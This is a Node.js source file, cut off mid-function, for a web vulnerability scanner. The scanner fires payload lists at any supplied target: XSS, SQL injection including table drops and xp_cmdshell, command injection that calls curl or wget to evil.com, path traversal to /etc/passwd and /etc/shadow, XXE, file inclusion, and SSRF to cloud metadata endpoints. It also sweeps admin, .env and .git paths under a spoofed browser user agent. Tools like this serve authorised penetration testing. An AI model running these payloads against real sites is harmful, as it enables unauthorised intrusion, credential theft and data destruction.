
const express = require('express');
const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');
const app = express();

// Middleware
app.use(express.json());
app.use(express.static('public'));

// Comprehensive vulnerability database
const VULNERABILITY_PATTERNS = {
  xss_patterns: [
    '<script>', 'javascript:', 'onload=', 'onerror=', 'onclick=', 'onmouseover=',
    'onsubmit=', 'onfocus=', 'onblur=', 'onchange=', 'vbscript:', 'data:text/html',
    'expression(', 'url(javascript:', '<iframe', '<object', '<embed', '<applet',
    '<meta', '<link', '<style', '<img', '<svg', '<video', '<audio', '<source',
    'eval(', 'setTimeout(', 'setInterval(', 'document.write', 'innerHTML',
    'document.cookie', 'localStorage', 'sessionStorage'
  ],
  sql_injection: [
    'error in your SQL syntax', 'mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB Provider',
    'PostgreSQL query failed', 'SQLite error', 'Warning: mysql_', 'Valid MySQL result',
    'MySQLSyntaxErrorException', 'com.mysql.jdbc', 'Syntax error in string',
    'ORA-00933', 'ORA-06512', 'Microsoft Access Driver', 'JET Database Engine',
    'SQLServer JDBC Driver', 'SqlException', 'System.Data.SqlClient.SqlException',
    'Unclosed quotation mark', 'Microsoft VBScript runtime', 'ADODB.Field',
    'BOF or EOF', 'ADODB.Command', 'JET Database', 'Access Database Engine',
    'Dynamic SQL Error', 'Warning: pg_', 'valid PostgreSQL result', 'Npgsql.',
    'PG::Error', 'SPP-00968', 'ORA-00942', 'ORA-00904', 'ORA-00903'
  ],
  nosql_injection: [
    'MongoError', 'CastError', 'ValidationError', 'E11000 duplicate key',
    'MongoDB\\Driver\\Exception', 'MongoDB server version', 'db.collection.find',
    'Cannot query field', 'unknown operator', '$where parse error',
    'ReferenceError:', 'SyntaxError:', 'unexpected token'
  ],
  directory_traversal: [
    '../', '..\\', '%2e%2e%2f', '%2e%2e%5c', '..%2f', '..%5c',
    '%252e%252e%252f', '....//', '....\\\\', '..;/', '..;\\',
    'root:', '/etc/passwd', '/etc/shadow', '/etc/hosts', '/proc/version',
    'windows\\system32', 'boot.ini', 'win.ini', 'system.ini'
  ],
  information_disclosure: [
    'phpinfo()', 'Server: Apache', 'X-Powered-By:', 'index of /',
    'directory listing', 'apache tomcat', 'nginx/', 'IIS/',
    'PHP/', 'ASP.NET', 'JSP', 'perl', 'python', 'ruby',
    'application/json', 'text/xml', 'database error', 'stack trace',
    'exception', 'warning:', 'notice:', 'fatal error:', 'parse error:',
    'undefined variable', '.env', 'config.php', 'wp-config.php',
    'web.config', 'application.properties', 'settings.py'
  ],
  command_injection: [
    'uid=', 'gid=', 'groups=', 'sh:', 'bash:', 'cmd.exe', 'command not found',
    'cannot access', 'permission denied', 'no such file', 'syntax error',
    'unexpected EOF', 'line 1:', 'Usage:', 'invalid option',
    'Microsoft Windows', 'Volume Serial Number', 'Directory of'
  ],
  file_inclusion: [
    'failed to open stream', 'No such file or directory', 'Permission denied',
    'include_path', 'open_basedir restriction', 'Warning: include',
    'Warning: require', 'Fatal error: require', 'include(): Failed opening'
  ],
  xxe: [
    'xml version=', 'DOCTYPE', 'ENTITY', 'xml-stylesheet', 'SYSTEM',
    'file://', 'http://', 'ftp://', 'data:', 'expect://',
    'XML Parsing Error', 'XML syntax error', 'Invalid XML'
  ],
  ssrf: [
    'Connection refused', 'Connection timeout', 'Name or service not known',
    'No route to host', 'Network is unreachable', 'Internal Server Error',
    'localhost', '127.0.0.1', '0.0.0.0', '10.', '172.', '192.168.',
    'metadata.google.internal', 'gstatic.com', 'amazonaws.com'
  ]
};

// Comprehensive payloads for different attack vectors
const ATTACK_PAYLOADS = {
  xss: [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    "';alert('XSS');//",
    'javascript:alert("XSS")',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<iframe src="javascript:alert(`XSS`)">',
    '<body onload=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '<select onfocus=alert("XSS") autofocus>',
    '<textarea onfocus=alert("XSS") autofocus>',
    '<keygen onfocus=alert("XSS") autofocus>',
    '<video><source onerror="alert(\'XSS\')">',
    '<audio src=x onerror=alert("XSS")>',
    '<details open ontoggle=alert("XSS")>',
    '<marquee onstart=alert("XSS")>',
    '"><img src=x onerror=alert("XSS")>',
    '\';alert(\'XSS\');//',
    '";alert("XSS");//',
    '</script><script>alert("XSS")</script>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>alert(/XSS/.source)</script>',
    '<script>alert`XSS`</script>',
    '<script>alert(document.domain)</script>',
    '<script>alert(document.cookie)</script>'
  ],
  sql_injection: [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "'; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    "' AND (SELECT COUNT(*) FROM users)>0--",
    "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
    "' WAITFOR DELAY '00:00:05'--",
    "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
    "' OR SLEEP(5)--",
    "' OR pg_sleep(5)--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--",
    "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1' OR (SELECT*FROM(SELECT+SLEEP(5))a)--'",
    "1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
    "admin'--",
    "admin'/*",
    "' or 1=1 limit 1 -- -+",
    "' or '1'='1",
    "' or 'x'='x",
    "' or 0=0 --",
    "' or 0=0 #",
    "' or 1=1 or ''='"
  ],
  nosql_injection: [
    "' || '1'=='1",
    "' || 1==1//",
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "1==1"}',
    '{"$or": [{"username": {"$ne": null}}, {"username": {"$exists": true}}]}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    "'; return db.users.find(); var dummy='",
    "'; return JSON.stringify(db.getCollectionNames()); var dummy='",
    'true, $where: "1==1"',
    ', $where: "1==1"',
    '$where: "1==1"',
    '{"$gt": undefined}',
    '{"$regex": ""}',
    '{"$exists": true}',
    '{"$type": 2}',
    '{"$in": [""]}',
    '{"$all": []}',
    '{"$size": 0}'
  ],
  directory_traversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '....//....//....//etc/passwd',
    '..;/..;/..;/etc/passwd',
    '../../../../../../../etc/passwd',
    '..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    '/var/www/../../etc/passwd',
    '\\..\\..\\..\\etc\\passwd',
    '/.../.../.../etc/passwd',
    '/....//....//....//etc/passwd',
    '../../../proc/version',
    '../../../proc/self/environ',
    '../../../proc/self/cmdline',
    '..\\..\\..\\boot.ini',
    '..\\..\\..\\windows\\win.ini',
    '../../../etc/shadow',
    '../../../etc/group',
    '../../../etc/hosts',
    '../../../etc/resolv.conf',
    '../../../etc/fstab',
    '../../../var/log/apache2/access.log',
    '../../../var/log/auth.log'
  ],
  command_injection: [
    '; id',
    '| id',
    '& id',
    '&& id',
    '|| id',
    '`id`',
    '$(id)',
    '; cat /etc/passwd',
    '| cat /etc/passwd',
    '& whoami',
    '&& whoami',
    '$(whoami)',
    '`whoami`',
    '; ls -la',
    '| ls -la',
    '; pwd',
    '| pwd',
    '; uname -a',
    '| uname -a',
    '; netstat -an',
    '| netstat -an',
    '; ps aux',
    '| ps aux',
    '$(curl http://evil.com)',
    '`curl http://evil.com`',
    '; wget http://evil.com',
    '| wget http://evil.com'
  ],
  file_inclusion: [
    'php://filter/convert.base64-encode/resource=index.php',
    'php://filter/read=string.rot13/resource=index.php',
    'file:///etc/passwd',
    'file:///c:/windows/system32/drivers/etc/hosts',
    'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
    'expect://id',
    'zip://test.zip%23shell.php',
    'phar://test.phar/shell.php',
    'php://input',
    'php://filter/resource=../../../etc/passwd',
    '/proc/self/environ',
    '/proc/version',
    '/proc/cmdline'
  ],
  xxe: [
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.txt">]><foo>&xxe;</foo>',
    '<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init;]><test/>',
    '<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY test SYSTEM \'file:///c:/windows/system32/drivers/etc/hosts\'>]><root>&test;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY read SYSTEM \'php://filter/convert.base64-encode/resource=index.php\'>]><root>&read;</root>'
  ],
  ssrf: [
    'http://localhost:22',
    'http://127.0.0.1:22',
    'http://127.0.0.1:3306',
    'http://127.0.0.1:5432',
    'http://127.0.0.1:6379',
    'http://127.0.0.1:9200',
    'http://169.254.169.254/latest/meta-data/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'file:///etc/passwd',
    'file:///proc/version',
    'gopher://127.0.0.1:22/_test',
    'dict://127.0.0.1:22/test',
    'sftp://127.0.0.1/test',
    'ldap://127.0.0.1:389/test',
    'tftp://127.0.0.1/test'
  ]
};

// Common vulnerable endpoints and files
const COMMON_ENDPOINTS = [
  // Admin panels
  '/admin', '/administrator', '/admin.php', '/admin/', '/admin/login',
  '/admin/admin.php', '/admin/index.php', '/admin/login.php', '/admin/home.php',
  '/admin/controlpanel.php', '/admin/cp.php', '/cpanel', '/controlpanel',
  '/adminarea', '/bb-admin', '/adminLogin', '/admin_area', '/panel-administracion',
  '/instadmin', '/memberadmin', '/administratorlogin', '/adm', '/admin/account.php',
  '/admin/index.html', '/admin/login.html', '/admin/admin.html', '/admin_area/admin.php',
  '/admin_area/login.php', '/siteadmin', '/siteadmin/login.php', '/siteadmin/index.php',
  '/ss_vms', '/bb-admin/index.php', '/bb-admin/login.php', '/acceso.php',
  '/admin_area/index.php', '/admin_login.php', '/panel_administracion/login.php',
  
  // Login pages
  '/login', '/login.php', '/login.html', '/login/', '/signin', '/signin.php',
  '/sign-in', '/log-in', '/member', '/authentication', '/auth', '/authorize',
  '/token', '/validate', '/check', '/user', '/users', '/account', '/accounts',
  '/profile', '/profiles', '/dashboard', '/panel', '/cp', '/wp-login.php',
  '/user/login', '/members/login', '/login.jsp', '/login.asp', '/login.aspx',
  
  // Common web applications
  '/wp-admin', '/wp-admin/', '/wp-login.php', '/wp-content', '/wp-includes',
  '/wordpress', '/wp', '/blog', '/phpmyadmin', '/pma', '/phpMyAdmin',
  '/mysql', '/sql', '/database', '/db', '/myadmin', '/admin/pma',
  '/admin/phpmyadmin', '/phpmyadmin2', '/phpmyadmin3', '/phpmyadmin4',
  '/phpMyAdmin2', '/phpMyAdmin3', '/phpMyAdmin4', '/admin/sqladmin',
  
  // Configuration files
  '/config', '/config.php', '/config.inc.php', '/config.inc', '/config/',
  '/configuration.php', '/configurations', '/settings.php', '/setting',
  '/options.php', '/option', '/conf', '/conf.php', '/includes/config.php',
  '/.env', '/.env.local', '/.env.production', '/.env.development',
  '/web.config', '/Web.config', '/WEB.CONFIG', '/application.properties',
  '/config.properties', '/database.properties', '/hibernate.cfg.xml',
  '/context.xml', '/server.xml', '/settings.py', '/local_settings.py',
  
  // Backup and temporary files
  '/backup', '/backups', '/bak', '/old', '/temp', '/tmp', '/test',
  '/backup.sql', '/backup.zip', '/backup.tar.gz', '/backup.rar',
  '/database.sql', '/db.sql', '/dump.sql', '/data.sql', '/mysql.sql',
  '/backup.php', '/phpinfo.php', '/info.php', '/test.php', '/debug.php',
  '/readme.txt', '/README.txt', '/readme.html', '/README.html',
  '/changelog.txt', '/CHANGELOG.txt', '/install.php', '/setup.php',
  
  // Git and version control
  '/.git', '/.git/', '/.git/config', '/.git/HEAD', '/.git/logs/HEAD',
  '/.gitignore', '/.svn', '/.svn/', '/.hg', '/.bzr', '/CVS',
  '/.git/refs/heads/master', '/.git/index', '/.git/objects',
  
  // Common directories
  '/images', '/img', '/css', '/js', '/javascript', '/scripts', '/style',
  '/files', '/file', '/download', '/downloads', '/upload', '/uploads',
  '/media', '/assets', '/static', '/public', '/private', '/secret',
  '/hidden', '/internal', '/system', '/sys', '/proc', '/var', '/etc',
  '/root', '/home', '/usr', '/opt', '/tmp', '/temp', '/cache',
  
  // API endpoints
  '/api', '/api/', '/api/v1', '/api/v2', '/rest', '/restapi', '/webservice',
  '/service', '/services', '/graphql', '/soap', '/xml', '/json',
  '/api/users', '/api/admin', '/api/login', '/api/auth', '/api/token',
  '/api/config', '/api/settings', '/api/status', '/api/health',
  
  // Development and debug
  '/debug', '/trace', '/log', '/logs', '/error', '/errors', '/exception',
  '/status', '/health', '/info', '/version', '/build', '/release',
  '/phpinfo', '/server-status', '/server-info', '/crossdomain.xml',
  '/clientaccesspolicy.xml', '/robots.txt', '/sitemap.xml', '/sitemap',
  
  // Search and common functionality
  '/search', '/search.php', '/find', '/query', '/results', '/report',
  '/contact', '/about', '/help', '/faq', '/support', '/feedback',
  '/newsletter', '/subscribe', '/unsubscribe', '/register', '/registration',
  
  // E-commerce and CMS
  '/shop', '/store', '/cart', '/checkout', '/payment', '/order', '/orders',
  '/product', '/products', '/category', '/categories', '/catalog',
  '/cms', '/content', '/page', '/pages', '/post', '/posts', '/article',
  '/articles', '/news', '/blog', '/forum', '/forums', '/community'
];

// Headers to test
const SECURITY_HEADERS = [
  'X-Frame-Options', 'X-XSS-Protection', 'X-Content-Type-Options',
  'Strict-Transport-Security', 'Content-Security-Policy', 
  'Referrer-Policy', 'Feature-Policy', 'Permissions-Policy',
  'X-Permitted-Cross-Domain-Policies', 'Cross-Origin-Embedder-Policy',
  'Cross-Origin-Opener-Policy', 'Cross-Origin-Resource-Policy'
];

class WebSecurityScanner {
  constructor(target) {
    this.target = target;
    this.vulnerabilities = [];
    this.testedEndpoints = new Set();
    this.foundFiles = new Set();
    this.headers = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    };
    this.cookies = {};
    this.baseResponse = null;
  }

  async scanTarget() {
    console.log(`🔍 Starting comprehensive security scan for: ${this.target}`);
    
    try {
      // Phase 1: Information Gathering
      await this.informationGathering();
      
      // Phase 2: Endpoint Discovery
      await this.endpointDiscovery();
      
      // Phase 3: Vulnerability Testing
      await this.vulnerabilityTesting();
      
      // Phase 4: Advanced Tests
      await this.advancedTesting();
      
      return this.generateComprehensiveReport();
    } catch (error) {
      console.error('Scan error:', error.message);
      return { error: error.message };
    }
  }

  async informationGathering() {
    console.log('📊 Phase 1: Information Gathering');
    
    try {
      const response = await axios.get(this.target, { 
        headers: this.headers,
        timeout: 15000,
        maxRedirects: 5
      });
      
      this.baseResponse = response;
      const $ = cheerio.load(response.data);
      
      // Extract technology stack
      await this.detectTechnologies(response, $);
      
      // Check security headers
      await this.checkSecurityHeaders(response);
      
      // Analyze HTML for sensitive information
      await this.analyzeHTMLContent(response.data, $);
      
      // Check robots.txt and common files
      await this.checkCommonFiles();
      
    } catch (error) {
      console.log('Information gathering failed:', error.message);
    }
  }

  async detectTechnologies(response, $) {
    // Server detection
    const server = response.headers['server'];
    if (server) {
      this.addVulnerability('INFO_DISCLOSURE', 
        `Server information disclosure: ${server}`,
        'Low',
        `Server header reveals: ${server}`,
        `curl -I ${this.target}`
      );
    }

    // Framework detection
    const frameworks = {
      'X-Powered-By': response.headers['x-powered-by'],
      'X-AspNet-Version': response.headers['x-aspnet-version'],
      'X-AspNetMvc-Version': response.headers['x-aspnetmvc-version']
    };

    Object.entries(frameworks).forEach(([header, value]) => {
      if (value) {
        this.addVulnerability('INFO_DISCLOSURE',
          `Framework disclosure via ${header}`,
          'Low',
          `${header} header reveals: ${value}`,
          `curl -I ${this.target}`
        );
      }
    });

    // CMS detection
    const cmsSignatures = {
      'WordPress': ['/wp-content/', '/wp-includes/', 'wp-json'],
      'Drupal': ['/sites/default/', '/modules/', '/themes/'],
      'Joomla': ['/components/', '/modules/', '/templates/'],
      'Magento': ['/skin/frontend/', '/js/mage/'],
      'PrestaShop': ['/themes/', '/modules/', '/tools/'],
      'Django': ['csrfmiddlewaretoken', 'django'],
      'Laravel': ['laravel_session', '_token'],
      'CodeIgniter': ['ci_session', 'codeigniter'],
      'Symfony': ['_sf2_', 'symfony']
    };

    Object.entries(cmsSignatures).forEach(([cms, signatures]) => {
      if (signatures.some(sig => response.data.includes(sig))) {
        this.addVulnerability('INFO_DISCLOSURE',
          `${cms} CMS detected`,
          'Info',
          `Website appears to be running ${cms}`,
          `curl ${this.target} | grep -i "${signatures[0]}"`
        );
      }
    });
  }

  async checkSecurityHeaders(response) {
    SECURITY_HEADERS.forEach(header => {
      if (!response.headers[header.toLowerCase()]) {
        this.addVulnerability('MISSING_SECURITY_HEADER',
          `Missing security header: ${header}`,
          this.getHeaderSeverity(header),
          `The ${header} security header is not set, which may lead to security vulnerabilities`,
          `curl -I ${this.target} | grep -i "${header}"`
        );
      }
    });

    // Check for insecure header values
    const xssProtection = response.headers['x-xss-protection'];
    if (xssProtection === '0') {
      this.addVulnerability('INSECURE_HEADER',
        'XSS Protection disabled',
        'Medium',
        'X-XSS-Protection is explicitly disabled',
        `curl -I ${this.target} | grep -i "x-xss-protection"`
      );
    }
  }

  getHeaderSeverity(header) {
    const criticalHeaders = ['Content-Security-Policy', 'Strict-Transport-Security'];
    const highHeaders = ['X-Frame-Options', 'X-Content-Type-Options'];
    
    if (criticalHeaders.includes(header)) return 'High';
    if (highHeaders.includes(header)) return 'Medium';
    return 'Low';
  }

  async analyzeHTMLContent(html, $) {
    // Check for sensitive comments
    const comments = html.match(/<!--[\s\S]*?-->/g) || [];
    comments.forEach(comment => {
      const sensitivePatterns = ['password', 'admin', 'secret', 'key', 'token', 'api', 'database', 'config', 'debug', 'todo', 'fixme', 'hack', 'temp'];
      
      sensitivePatterns.forEach(pattern => {
        if (comment.toLowerCase().includes(pattern)) {
          this.addVulnerability('INFO_DISCLOSURE',
            'Sensitive information in HTML comments',
            'Medium',
            `Comment contains sensitive keyword "${pattern}": ${comment.substring(0, 200)}...`,
            `curl ${this.target} | grep -o "<!--.*-->" | grep -i "${pattern}"`
          );
        }
      });
    });

    // Check for exposed credentials or API keys
    const apiKeyPatterns = [
      /api[_-]?key["\s]*[:=]["\s]*[a-zA-Z0-9]{16,}/gi,
      /secret[_-]?key["\s]*[:=]["\s]*[a-zA-Z0-9]{16,}/gi,
      /access[_-]?token["\s]*[:=]["\s]*[a-zA-Z0-9]{16,}/gi,
      /password["\s]*[:=]["\s]*[a-zA-Z0-9]{8,}/gi,
      /sk_[a-z]{4,20}/gi,
      /pk_[a-z]{4,20}/gi
    ];

    apiKeyPatterns.forEach(pattern => {
      const matches = html.match(pattern);
      if (matches) {
        matches.forEach(match => {
          this.addVulnerability('CREDENTIAL_EXPOSURE',
            'Potential API key or credential exposed',
            'Critical',
            `Found potential credential: ${match.substring(0, 50)}...`,
            `curl ${this.target} | grep -E "${pattern.source}"`
          );
        });
      }
    });

    // Check for development/debug information
    const debugPatterns = ['var_dump', 'print_r', 'console.log', 'debug', 'trace', 'error_reporting', 'display_errors'];
    debugPatterns.forEach(pattern => {
      if (html.toLowerCase().includes(pattern)) {
        this.addVulnerability('DEBUG_INFO',
          `Debug information found: ${pattern}`,
          'Low',
          `Development debug code detected in production`,
          `curl ${this.target} | grep -i "${pattern}"`
        );
      }
    });

    // Check for form inputs without CSRF protection
    const forms = $('form');
    forms.each((i, form) => {
      const $form = $(form);
      const hasCSRF = $form.find('input[name*="csrf"], input[name*="token"], input[name*="_token"]').length > 0;
      
      if (!hasCSRF && ($form.find('input[type="password"]').length > 0 || $form.attr('method')?.toLowerCase() === 'post')) {
        this.addVulnerability('CSRF_MISSING',
          'Form without CSRF protection',
          'Medium',
          `Form at ${$form.attr('action') || 'current page'} lacks CSRF token`,
          `curl ${this.target} | grep -A 10 -B 2 "<form"`
        );
      }
    });
  }

  async checkCommonFiles() {
    const commonFiles = [
      '/robots.txt', '/sitemap.xml', '/.well-known/security.txt',
      '/crossdomain.xml', '/clientaccesspolicy.xml', '/.htaccess',
      '/web.config', '/WEB-INF/web.xml', '/META-INF/MANIFEST.MF'
    ];

    for (const file of commonFiles) {
      try {
        const response = await axios.get(this.target + file, {
          headers: this.headers,
          timeout: 5000,
          validateStatus: () => true
        });

        if (response.status === 200 && response.data.length > 0) {
          this.foundFiles.add(file);
          
          if (file === '/robots.txt') {
            this.analyzeRobotsTxt(response.data);
          } else if (file === '/.htaccess' || file === '/web.config') {
            this.addVulnerability('CONFIG_EXPOSURE',
              `Configuration file accessible: ${file}`,
              'High',
              `Configuration file ${file} is publicly accessible`,
              `curl ${this.target}${file}`
            );
          }
        }
      } catch (error) {
        // File not found or error - continue
      }
    }
  }

  analyzeRobotsTxt(content) {
    const lines = content.split('\n');
    lines.forEach(line => {
      if (line.toLowerCase().startsWith('disallow:')) {
        const path = line.split(':')[1]?.trim();
        if (path && path !== '/' && path.length > 1) {
          this.addVulnerability('INFO_DISCLOSURE',
            `Robots.txt reveals hidden path: ${path}`,
            'Low',
            `robots.txt disallows crawling of: ${path}`,
            `curl ${this.target}/robots.txt | grep -i "disallow"`
          );
        }
      }
    });
  }

  async endpointDiscovery() {
    console.log('🔍 Phase 2: Endpoint Discovery');
    
    const batchSize = 20;
    for (let i = 0; i < COMMON_ENDPOINTS.length; i += batchSize) {
      const batch = COMMON_ENDPOINTS.slice(i, i + batchSize);
      await Promise.all(batch.map(endpoint => this.testEndpoint(endpoint)));
    }
  }

  async testEndpoint(endpoint) {
    try {
      const url = this.target + endpoint;
      const response = await axios.get(url, {
        headers: this.headers,
        timeout: 8000,
        validateStatus: () => true,
        maxRedirects: 3
      });

      this.testedEndpoints.add(endpoint);

      if (response.status === 200) {
        this.addVulnerability('ENDPOINT_EXPOSURE',
          `Accessible endpoint found: ${endpoint}`,
          this.getEndpointSeverity(endpoint),
          `Endpoint ${endpoint} is publicly accessible (Status: ${response.status})`,
          `curl -i ${url}`
        );

        // Analyze endpoint content
        await this.analyzeEndpointContent(endpoint, response);
        
      } else if (response.status === 403) {
        this.addVulnerability('ENDPOINT_FORBIDDEN',
          `Forbidden endpoint detected: ${endpoint}`,
          'Low',
          `Endpoint exists but access is forbidden (Status: ${response.status})`,
          `curl -i ${url}`
        );
      } else if (response.status === 401) {
        this.addVulnerability('AUTH_ENDPOINT',
          `Authentication required: ${endpoint}`,
          'Medium',
          `Endpoint requires authentication (Status: ${response.status})`,
          `curl -i ${url}`
        );
      }

    } catch (error) {
      // Endpoint not accessible
    }
  }

  getEndpointSeverity(endpoint) {
    const criticalEndpoints = ['/admin', '/.env', '/config.php', '/wp-config.php', '/phpmyadmin'];
    const highEndpoints = ['/login', '/wp-admin', '/backup', '/database'];
    
    if (criticalEndpoints.some(critical => endpoint.includes(critical))) return 'Critical';
    if (highEndpoints.some(high => endpoint.includes(high))) return 'High';
    return 'Medium';
  }

  async analyzeEndpointContent(endpoint, response) {
    const content = response.data.toLowerCase();
    
    // Check for login forms
    if (content.includes('<input') && (content.includes('password') || content.includes('login'))) {
      this.addVulnerability('LOGIN_FORM',
        `Login form found at: ${endpoint}`,
        'Medium',
        'Login form detected - potential target for brute force attacks',
        `curl ${this.target}${endpoint} | grep -i "password\\|login"`
      );
    }

    // Check for database errors
    VULNERABILITY_PATTERNS.sql_injection.forEach(pattern => {
      if (content.includes(pattern.toLowerCase())) {
        this.addVulnerability('DATABASE_ERROR',
          `Database error exposed at: ${endpoint}`,
          'High',
          `Database error message found: ${pattern}`,
          `curl ${this.target}${endpoint}`
        );
      }
    });

    // Check for phpinfo
    if (content.includes('phpinfo()') || content.includes('php version')) {
      this.addVulnerability('INFO_DISCLOSURE',
        `PHP information disclosure at: ${endpoint}`,
        'High',
        'phpinfo() output accessible to public',
        `curl ${this.target}${endpoint}`
      );
    }
  }

  async vulnerabilityTesting() {
    console.log('🔍 Phase 3: Vulnerability Testing');
    
    await Promise.all([
      this.testXSSVulnerabilities(),
      this.testSQLInjection(),
      this.testNoSQLInjection(),
      this.testDirectoryTraversal(),
      this.testCommandInjection(),
      this.testFileInclusion(),
      this.testXXEVulnerabilities(),
      this.testSSRFVulnerabilities()
    ]);
  }

  async testXSSVulnerabilities() {
    console.log('🔍 Testing XSS vulnerabilities...');
    
    const testParams = ['q', 'search', 'query', 'input', 'data', 'text', 'name', 'value', 'id', 'user', 'comment', 'message'];
    
    for (const payload of ATTACK_PAYLOADS.xss) {
      for (const param of testParams) {
        try {
          const testUrl = `${this.target}?${param}=${encodeURIComponent(payload)}`;
          const response = await axios.get(testUrl, {
            headers: this.headers,
            timeout: 8000
          });

          if (response.data.includes(payload) || response.data.includes(payload.replace(/"/g, "'"))) {
            this.addVulnerability('XSS',
              'Reflected XSS vulnerability detected',
              'High',
              `Parameter "${param}" is vulnerable to XSS. Payload reflected: ${payload.substring(0, 100)}...`,
              `curl "${testUrl}"`
            );
          }

          // Check for WAF bypass indicators
          if (response.status === 403 || response.data.toLowerCase().includes('blocked')) {
            this.addVulnerability('WAF_DETECTED',
              'Web Application Firewall detected',
              'Info',
              `WAF may be blocking XSS attempts on parameter "${param}"`,
              `curl "${testUrl}"`
            );
          }

        } catch (error) {
          // Continue with next payload
        }
      }
    }
  }

  async testSQLInjection() {
    console.log('🔍 Testing SQL injection vulnerabilities...');
    
    const testParams = ['id', 'user', 'username', 'email', 'search', 'category', 'page', 'order', 'sort', 'filter'];
    
    for (const payload of ATTACK_PAYLOADS.sql_injection) {
      for (const param of testParams) {
        try {
          const testUrl = `${this.target}?${param}=${encodeURIComponent(payload)}`;
          const response = await axios.get(testUrl, {
            headers: this.headers,
            timeout: 10000
          });

          // Check for SQL error patterns
          VULNERABILITY_PATTERNS.sql_injection.forEach(pattern => {
            if (response.data.toLowerCase().includes(pattern.toLowerCase())) {
              this.addVulnerability('SQL_INJECTION',
                'SQL injection vulnerability detected',
                'Critical',
                `Parameter "${param}" is vulnerable to SQL injection. Error pattern: ${pattern}`,
                `curl "${testUrl}"`
              );
            }
          });

          // Check for time-based indicators
          const responseTime = Date.now();
          if (payload.includes('SLEEP') || payload.includes('WAITFOR')) {
            // Time-based detection would require more sophisticated timing analysis
          }

        } catch (error) {
          // Continue with next payload
        }
      }
    }
  }

  async testNoSQLInjection() {
    console.log('🔍 Testing NoSQL injection vulnerabilities...');
    
    for (const payload of ATTACK_PAYLOADS.nosql_injection) {
      try {
        const testUrl = `${this.target}?id=${encodeURIComponent(payload)}`;
        const response = await axios.get(testUrl, {
          headers: this.headers,
          timeout: 8000
        });

        VULNERABILITY_PATTERNS.nosql_injection.forEach(pattern => {
          if (response.data.includes(pattern)) {
            this.addVulnerability('NOSQL_INJECTION',
              'NoSQL injection vulnerability detected',
              'Critical',
              `NoSQL error pattern found: ${pattern}`,
              `curl "${testUrl}"`
            );
          }
        });

      } catch (error) {
        // Continue with next payload
      }
    }
  }

  async testDirectoryTraversal() {
    console.log('🔍 Testing directory traversal vulnerabilities...');
    
    const testParams = ['file', 'path', 'page', 'include', 'dir', 'folder', 'load', 'read', 'view', 'get'];
    
    for (const payload of ATTACK_PAYLOADS.directory_traversal) {
      for (const param of testParams) {
        try {
          const testUrl = `${this.target}?${param}=${encodeURIComponent(payload)}`;
          const response = await axios.get(testUrl, {
            headers: this.headers,
            timeout: 8000
          });

          // Check for successful traversal indicators
          const traversalIndicators = ['root:', 'daemon:', 'bin:', 'sys:', 'localhost', '[hosts]', 'Windows Registry'];
          
          traversalIndicators.forEach(indicator => {
            if (response.data.includes(indicator)) {
              this.addVulnerability('DIRECTORY_TRAVERSAL',
                'Directory traversal vulnerability detected',
                'High',
                `Parameter "${param}" allows directory traversal. Found: ${indicator}`,
                `curl "${testUrl}"`
              );
            }
          });

        } catch (error) {
          // Continue with next payload
        }
      }
    }
  }

  async testCommandInjection() {
    console.log('🔍 Testing command injection vulnerabilities...');
    
    const testParams = ['cmd', 'command', 'exec', 'system', 'shell', 'ping', 'host', 'ip', 'url'];
    
    for (const payload of ATTACK_PAYLOADS.command_injection) {
      for (const param of testParams) {
        try {
          const testUrl = `${this.target}?${param}=${encodeURIComponent(payload)}`;
          const response = await axios.get(testUrl, {
            headers: this.headers,
            timeout: 10000
          });

          VULNERABILITY_PATTERNS.command_injection.forEach(pattern => {
            if (response.data.includes(pattern)) {
              this.addVulnerability('COMMAND_INJECTION',
                'Command injection vulnerability detected',
                'Critical',
                `Parameter "${param}" allows command injection. Output contains: ${pattern}`,
                `curl "${testUrl}"`
              );
            }
          });

        } catch (error) {
          // Continue with next payload
        }
      }
    }
  }

  async testFileInclusion() {
    console.log('🔍 Testing file inclusion vulnerabilities...');
    
    for (const payload of ATTACK_PAYLOADS.file_inclusion) {
      try {
        const testUrl = `${this.target}?file=${encodeURIComponent(payload)}`;
        const response = await axios.get(testUrl, {
          headers: this.headers,
          timeout: 8000
        });

        // Check for file inclusion success indicators
        if (payload.includes('base64') && response.data.includes('PD9waHA')) {
